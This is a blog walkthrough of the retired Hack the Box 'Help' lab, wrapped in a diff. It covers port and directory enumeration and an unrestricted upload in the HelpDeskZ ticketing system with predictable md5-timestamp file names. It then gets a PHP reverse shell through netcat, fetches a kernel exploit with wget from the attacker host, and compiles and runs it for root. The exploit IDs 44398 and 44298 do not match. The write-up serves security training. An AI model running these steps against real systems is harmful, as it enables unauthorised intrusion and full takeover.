@@ -1,0 +1,104 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Box: Help Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-help-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-06-23T14:28:58+00:00">June 23, 2019</time><time class="updated" datetime="2025-06-27T12:35:03+00:00">June 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Help is a recently retired CTF challenge VM on Hack the Box and the objective remains the same– Capture the root flag. Hack the Box offers a wide range of VMs for practice from beginner to advanced level and it is great for penetration testers and researchers.</span></p>
+<p><span style="color: #000000;">Level: Intermediate</span></p>
+<p><span style="color: #000000;">Task: To find user.txt and root.txt file</span></p>
+<p><span style="color: #000000;">Note: Since these labs are online available, therefore, they have a static IP. The IP of Help is 10.10.10.121</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Nmap)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Web Spidering (dirb)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Analyzing the behaviour of submitting ticket script</span></li>
+<li><span style="color: #000000;">Uploading PHP shell and noting the timestamp</span></li>
+<li><span style="color: #000000;">Converting shell+timestamp to md5 hash</span></li>
+<li><span style="color: #000000;">Finding shell on the web server</span></li>
+<li><span style="color: #000000;">Getting reverse shell through netcat</span></li>
+<li><span style="color: #000000;">Reading user.txt</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Finding kernel exploit of Linux 4.4.0 version.</span></li>
+<li><span style="color: #000000;">Compiling with GCC and escalating privilege</span></li>
+<li><span style="color: #000000;">Reading root.txt</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<p><span style="color: #000000;">Let’s start off with the most obvious step, that is nmap to check open ports.</span></p>
+<pre class="lang:default decode:true">nmap -A 10.10.10.121</pre>
+<p><span style="color: #000000;">Here I found port 22 for SSH, 80 and 3000 for HTTP are opened others were filtered</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-sc_ZXSQfbMw/XQ-J6ggN-II/AAAAAAAAe8U/o-DzbU93K7k0JY93ZlNeEamrbEU7zxwvACLcBGAs/s1600/1.png"/></strong></span></p>
+<p><span style="color: #000000;">We immediately proceed towards port 80 when we see it open. But there was absolutely nothing on the homepage.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nvGkhMfp8GY/XQ-J8Gxx2aI/AAAAAAAAe8k/vnJXccC7sHIAeQHf9Q7DrZayKiBmHjrkQCLcBGAs/s1600/2.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">But maybe, there is some other directory which is set as a homepage for a web application, so we won’t stop ourselves from directory enumeration with dirb.</span></p>
+<pre class="lang:default decode:true">dirb http://10.10.10.121</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sm2r9MABxVk/XQ-J8qR5axI/AAAAAAAAe8w/hTu--E4JP6IvRIdEJBxBI5dUzuqzaCw9gCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Here we found two directories, one is the javascript directory which seems of less use as per usual. But then there is another directory called <strong>/support</strong> which seemed interesting. We checked it on the browser, and it seemed like a ticketing system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UUq1od2V0og/XQ-J9INZBkI/AAAAAAAAe80/73Mla8Pq97Mn7mpQzuw22t642y6XvjgKwCLcBGAs/s1600/4.png"/></span></p>
+<h3><span style="color: #000000;"><strong>Exploiting </strong></span></h3>
+<p><span style="color: #000000;">Now, it is obvious that there will be a file upload option given in any ticketing system. And maybe, it is also possible that there is a vulnerability in the file upload mechanism.</span></p>
+<p><span style="color: #000000;">We created a sample text file called demo.txt just to check whether the system is actually accepting uploads or not.</span></p>
+<p><span style="color: #000000;">It seemed to be working fine!!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wEAvXFKAhZU/XQ-J9cL7hMI/AAAAAAAAe84/xTxi_vt0oao0iz6Fq2AP9B5c1jIXY53CgCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">It successfully got uploaded and redirected us back to the homepage.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6RnjNo_kvI8/XQ-J9usn38I/AAAAAAAAe88/H14TGSDcEwMWvWyyZEieH84hs8zLVnlfQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Now we tried enumerating the web server on a deeper level, but we couldn’t see our text file anywhere. It is possible that the php backend would have just renamed the file as per dev defined rules. <em>Only if there was a way to check the code!</em></span></p>
+<p><span style="color: #000000;">After googling HelpDeskZ, we found that the source code was available on GitHub. And that could actually give us a closer look at the code of the upload script.</span></p>
+<p><span style="color: #000000;">Now, in controllers<strong><em>/submit_ticket_controller.php</em></strong>, we found the code that was responsible for uploading a file on the server.</span></p>
+<p><span style="color: #000000;"><strong>There are three interesting noteworthy things here:</strong></span></p>
+<ol>
+<li><span style="color: #000000;">The file uploaded is going to “<em>/support/&lt;Upload_dir&gt;/tickets</em>”</span></li>
+<li><span style="color: #000000;">There is no check on the type of file being uploaded! The error message is generated after the file is already uploaded so it has no actual significance!</span></li>
+<li><span style="color: #000000;">File uploaded is being converted to a format: <em>md5(shellname+ epoch timestamp) + .php</em></span></li>
+</ol>
+<p><span style="color: #000000;">We are certain that it is in fact epoch timestamp because of the working of “time()” function</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iRQgax9f6Ng/XQ-J6yV9BbI/AAAAAAAAe8Y/k7LsrO1G8_s1hV7O4lRm1Ffzd6kBCW2RwCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">So, it is pretty clear that we will upload a php reverse shell (we took pentester monkey’s reverse netcat php shell) and work towards exploiting this file upload vulnerability. But we were unable to find our text file a few minutes ago. Now that we know what the format of storing the file on the web server is, let’s work our way towards manually creating an md5 hash.</span></p>
+<p><span style="color: #000000;">For this, we need to know the current time on the web server. Our time zone could be way different than the server’s and to generate an exact timestamp, we upload a php shell while capturing the network request in developer tools in Firefox.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oRQ8S_mIvl0/XQ-J-du_ANI/AAAAAAAAe9E/XtI6ZTwXxdoHQaeIUNqjYSHVwaq13QlXACLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Now that we had the time in GMT, we headed to <a style="color: #000000;" href="http://www.epochconverter.com">www.epochconverter.com</a> and converted this time into an epoch timestamp.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PRZsKxFkJP0/XQ-J-gUJLrI/AAAAAAAAe9I/--boaTuViPAPc4hFtEb84s2M12P5hSuBgCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Now that we had obtained this timestamp, we could either write a short script in PHP that uses an md5 hash function to generate the hash or we can simply open the php in an interactive mode:</span></p>
+<pre class="lang:default decode:true">php –a
+echo md5("myshell.php1560956116");</pre>
+<p><span style="color: #000000;">Your timestamp will vary than ours.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2FYNmzYSa8c/XQ-J6mqf3gI/AAAAAAAAe8Q/GXf4lvk1ktwzlxBor7fB_mw__R7oXOQaACLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Now that it had given us a hash, all was left to do was to find it and open it in our browser, set a reverse nc connection and get a shell.</span></p>
+<p><span style="color: #000000;">And in the article above you can see that we know it is being uploaded to “/support/&lt;upload_dir&gt;/tickets” but the problem was we didn’t know what the name of upload directory is. Our best bet was going with the name “uploads” since we saw that folder name in the GitHub files as well.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kPUJuLZyNgc/XQ-J7T_iyMI/AAAAAAAAe8c/RKI48CS-IcQFXMZXxMg8qOxwt6H9Wrx3QCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">So, we set a reverse netcat listener and got a shell immediately! We spawned a proper TTY using python and read the user.txt file in home directory.</span></p>
+<pre class="lang:default decode:true">nc –lvp 1234
+python –c 'import pty;pty.spawn("/bin/bash")'
+cd /home/help
+cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YKgEHp-zGUc/XQ-J7wlXwII/AAAAAAAAe8g/DJ27x79gaL8-6uo9ip4wHi6nELROwafLACLcBGAs/s1600/19.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">Now for the privilege escalation part, we checked the kernel version with <strong>uname –a </strong>and found it to be vulnerable to a kernel exploit. We downloaded it using searchsploit and That made it super easy!</span></p>
+<pre class="lang:default decode:true">searchsploit 4.4.0-116
+searchsploit –m 44398
+python –m SimpleHTTPServer 8081</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c22mlb1Wdyg/XQ-J8TPNbtI/AAAAAAAAe8o/8RLPcB6D4VYkO0fMZGimXc-7_1-c6SsyACLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">We changed the directory to tmp and downloaded this exploit using wget command, compile it with GCC and boom went the magic!</span></p>
+<pre class="lang:default decode:true ">wget http://10.10.14.11:8081/44298.c
+gcc 44298.c -o kernel
+./kernel
+cd /root</pre>
+<p><span style="color: #000000;">And voila! That’s how we escalated privilege in Help CTF and read the congratulatory message under root directory in root.txt.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-SaVudrWdxZs/XQ-J8RjYSgI/AAAAAAAAe8s/ldbvH-MfxCcJ-di8alcgn2j_sbqWg-sjQCLcBGAs/s1600/21.png"/></strong></span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
